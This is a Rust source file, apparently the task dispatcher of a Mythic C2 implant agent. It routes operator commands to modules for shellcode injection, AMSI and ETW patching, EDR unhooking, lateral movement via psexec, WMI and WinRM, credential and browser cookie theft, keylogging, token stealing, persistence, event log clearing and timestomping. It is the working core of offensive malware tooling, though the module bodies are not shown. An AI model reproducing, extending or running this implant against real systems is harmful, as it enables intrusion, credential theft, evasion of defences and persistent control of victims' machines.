// tasking.rs
use crate::{AgentTask, SharedData};
use crate::mythic_error;
use crate::socks::start_socks;
use std::collections::VecDeque;
use std::error::Error;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    mpsc, Arc,
};

// Import all other commands
use crate::{
    askcreds, browser_cookies, c2manage, cat, cd, cleanup, clipboard, collection, cp, credentials, discovery, download, evasion, execute, exit, getenv, getprivs, jobs, lateral, ldap, ls, mkdir, mv, netstat, persist, portfwd, portscan, ps, pwd,
    redirect, rm, screenshot, setenv, shell, shinject, sleep, ssh, stealth, token, unsetenv, upload, workinghours,
};

/// Represents a background task (job)
#[derive(Debug)]
pub struct BackgroundTask {
    pub command: String,
    pub parameters: String,
    pub id: u32,
    pub running: Arc<AtomicBool>,
    pub killable: bool,
    pub uuid: String,
    pub tx: mpsc::Sender<serde_json::Value>,
    pub rx: mpsc::Receiver<serde_json::Value>,
}

/// Main task handler
#[derive(Debug)]
pub struct Tasker {
    pub background_tasks: Vec<BackgroundTask>,
    pub completed_tasks: Vec<serde_json::Value>,
    pub dispatch_val: u32,
    pub cached_ids: VecDeque<u32>,
}

/// Callback prototype for background task threads
type SpawnCbType = fn(
    &mpsc::Sender<serde_json::Value>,
    mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>>;

impl Tasker {
    /// Create a new Tasker
    pub fn new() -> Self {
        Self {
            background_tasks: Vec::new(),
            completed_tasks: Vec::new(),
            dispatch_val: 0,
            cached_ids: VecDeque::new(),
        }
    }

    /// Process all pending tasks from Mythic
    pub fn process_tasks(
        &mut self,
        tasks: Option<&Vec<AgentTask>>,
        agent: &mut SharedData,
    ) -> Result<(), Box<dyn Error>> {
        if let Some(tasks) = tasks {
            for task in tasks.iter() {
                match task.command.as_str() {
                    // --- Background commands ---
                    "download" => self.spawn_bg(task, download::download_file, false)?,
                    "portscan" => self.spawn_bg(task, portscan::scan_ports, true)?,
                    #[cfg(target_os = "windows")]
                    "powershell" => self.spawn_bg(task, shell::run_powershell, false)?,
                    "redirect" => self.spawn_bg(task, redirect::setup_redirect, true)?,
                    "ssh-spawn" => self.spawn_bg(task, ssh::spawn::spawn_payload, false)?,
                    "ssh" => self.spawn_bg(task, ssh::run_ssh, false)?,
                    "socks" => self.spawn_bg(task, start_socks, true)?,
                    "shell" => self.spawn_bg(task, shell::run_cmd, false)?,
                    "upload" => self.spawn_bg(task, upload::upload_file, false)?,
                    #[cfg(target_os = "windows")]
                    "screenshot" => self.spawn_bg(task, screenshot::take_screenshot_upload, false)?,
                    #[cfg(not(target_os = "windows"))]
                    "screenshot" => self.completed_tasks.push(mythic_error!(task.id, "Screenshot is only supported on Windows".to_string())),
                    #[cfg(target_os = "windows")]
                    "shinject" => self.spawn_bg(task, shinject::inject_shellcode, false)?,
                    #[cfg(not(target_os = "windows"))]
                    "shinject" => self.completed_tasks.push(mythic_error!(task.id, "shinject is only supported on Windows".to_string())),

                    // --- Defense evasion commands ---
                    #[cfg(target_os = "windows")]
                    "amsi_patch" => self.spawn_bg(task, evasion::amsi_patch, false)?,
                    #[cfg(not(target_os = "windows"))]
                    "amsi_patch" => self.completed_tasks.push(mythic_error!(task.id, "amsi_patch is only supported on Windows".to_string())),
                    #[cfg(target_os = "windows")]
                    "etw_patch" => self.spawn_bg(task, evasion::etw_patch, false)?,
                    #[cfg(not(target_os = "windows"))]
                    "etw_patch" => self.completed_tasks.push(mythic_error!(task.id, "etw_patch is only supported on Windows".to_string())),
                    #[cfg(target_os = "windows")]
                    "unhook" => self.spawn_bg(task, evasion::unhook, false)?,
                    #[cfg(not(target_os = "windows"))]
                    "unhook" => self.completed_tasks.push(mythic_error!(task.id, "unhook is only supported on Windows".to_string())),

                    // --- Execution commands ---
                    #[cfg(target_os = "windows")]
                    "execute_assembly" => self.spawn_bg(task, execute::execute_assembly, false)?,
                    #[cfg(not(target_os = "windows"))]
                    "execute_assembly" => self.completed_tasks.push(mythic_error!(task.id, "execute_assembly is only supported on Windows".to_string())),
                    #[cfg(target_os = "windows")]
                    "bof" => self.spawn_bg(task, execute::bof, false)?,
                    #[cfg(not(target_os = "windows"))]
                    "bof" => self.completed_tasks.push(mythic_error!(task.id, "bof is only supported on Windows".to_string())),

                    // --- Lateral movement commands ---
                    "wmi_exec" => self.spawn_bg(task, lateral::wmi_exec, false)?,
                    "psexec" => self.spawn_bg(task, lateral::psexec, false)?,
                    "winrm_exec" => self.spawn_bg(task, lateral::winrm_exec, false)?,

                    // --- Job management ---
                    "jobkill" => {
                        match jobs::kill_job(task, &self.background_tasks) {
                            Ok(res) => self.completed_tasks.extend(res),
                            Err(e) => self.completed_tasks.push(mythic_error!(task.id, e.to_string())),
                        }
                    }

                    // --- Continued background messages ---
                    "continued_task" => {
                        for job in &self.background_tasks {
                            if task.id == job.uuid {
                                match serde_json::to_value(task) {
                                    Ok(msg) => {
                                        if let Err(e) = job.tx.send(msg) {
                                            self.completed_tasks.push(mythic_error!(
                                                task.id,
                                                format!("Send error: {e}")
                                            ));
                                        }
                                    }
                                    Err(e) => self
                                        .completed_tasks
                                        .push(mythic_error!(task.id, e.to_string())),
                                }
                                break;
                            }
                        }
                    }

                    // --- Foreground commands ---
                    _ => {
                        let res = match task.command.as_str() {
                            "sleep" => sleep::set_sleep(
                                task,
                                &mut agent.sleep_interval,
                                &mut agent.jitter,
                            )
                            .unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),

                            "exit" => exit::exit_agent(task, &mut agent.exit_agent),

                            "jobs" => jobs::list_jobs(task, &self.background_tasks),

                            "workinghours" => workinghours::working_hours(task, agent)
                                .unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),

                            "cat" => cat::cat_file(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "cd" => cd::change_dir(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "cleanup" => cleanup::cleanup(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "cp" => cp::copy_file(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "eventlog_clear" => cleanup::eventlog_clear(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "getenv" => getenv::get_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "getprivs" => getprivs::get_privileges(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "ls" => ls::make_ls(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "mkdir" => mkdir::make_directory(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "mv" => mv::move_file(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "netstat" => netstat::netstat(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "ps" => ps::get_process_list(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "pwd" => pwd::get_pwd(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "rm" => rm::remove(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "setenv" => setenv::set_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "clipboard" => clipboard::take_clipboard(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "askcreds" => askcreds::ask_credentials(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "credentials_dump" => credentials::credentials_dump(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "domain_info" => ldap::domain_info(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "domain_users" => ldap::domain_users(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "domain_computers" => ldap::domain_computers(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "ldap_search" => ldap::ldap_search(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "persist_schtask" => persist::persist_schtask(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "persist_registry" => persist::persist_registry(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "persist_service" => persist::persist_service(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "persist_wmi" => persist::persist_wmi(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "portfwd" => portfwd::port_forward(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "ssh-agent" => ssh::agent::ssh_agent(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "timestomp" => cleanup::timestomp(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "token_list" => token::token_list(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "token_steal" => token::token_steal(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "token_make" => token::token_make(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "token_use" => token::token_use(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "token_revert" => token::token_revert(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "unsetenv" => unsetenv::unset_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),

                            // Discovery commands
                            "net_shares" => discovery::net_shares(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "net_sessions" => discovery::net_sessions(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "net_loggedon" => discovery::net_loggedon(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "whoami" => discovery::whoami_cmd(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),

                            // Collection commands
                            "keylogger_start" => collection::keylogger_start(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "keylogger_stop" => collection::keylogger_stop(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "browser_creds" => collection::browser_creds(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "browser_cookies" => browser_cookies::browser_cookies(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),

                            // C2 management commands
                            "c2info" => c2manage::c2info(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "killdate" => c2manage::killdate(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),

                            // Stealth evasion commands
                            "stealth_sleep" => stealth::stealth_sleep(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "ntfs_read" => stealth::ntfs_read(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                            "minifilter_evade" => stealth::minifilter_evade(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),

                            _ => mythic_error!(
                                task.id,
                                format!("Command '{}' not implemented", task.command)
                            ),
                        };
                        self.completed_tasks.push(res);
                    }
                }
            }
        }
        Ok(())
    }

    /// Collect all completed task outputs and queued background messages
    pub fn get_completed_tasks(&mut self) -> Result<Vec<serde_json::Value>, Box<dyn Error>> {
        let mut completed = Vec::new();

        for job in self.background_tasks.iter() {
            while let Ok(msg) = job.rx.try_recv() {
                completed.push(msg);
            }

            if !job.running.load(Ordering::SeqCst) || Arc::strong_count(&job.running) == 1 {
                while let Ok(msg) = job.rx.try_recv() {
                    completed.push(msg);
                }
                job.running.store(false, Ordering::SeqCst);
                self.cached_ids.push_back(job.id);
            }
        }

        self.background_tasks
            .retain(|x| x.running.load(Ordering::SeqCst));
        completed.append(&mut self.completed_tasks);
        Ok(completed)
    }

    /// Generic wrapper for spawning background jobs
    fn spawn_bg(
        &mut self,
        task: &AgentTask,
        callback: SpawnCbType,
        killable: bool,
    ) -> Result<(), Box<dyn Error>> {
        let (tasker_tx, job_rx) = mpsc::channel();
        let (job_tx, tasker_rx) = mpsc::channel();

        // Assign new background ID
        let id = if let Some(id) = self.cached_ids.pop_front() {
            id
        } else {
            self.dispatch_val += 1;
            self.dispatch_val - 1
        };

        let running = Arc::new(AtomicBool::new(true));
        let running_ref = running.clone();
        let uuid = task.id.clone();

        std::thread::spawn(move || {
            if let Err(e) = callback(&job_tx, job_rx) {
                let _ = job_tx.send(mythic_error!(uuid, e.to_string()));
            }
            running_ref.store(false, Ordering::SeqCst);
        });

        tasker_tx.send(serde_json::to_value(task)?)?;

        self.background_tasks.push(BackgroundTask {
            command: task.command.clone(),
            parameters: task.parameters.clone(),
            uuid: task.id.clone(),
            killable,
            id,
            running,
            tx: tasker_tx,
            rx: tasker_rx,
        });
        Ok(())
    }
}
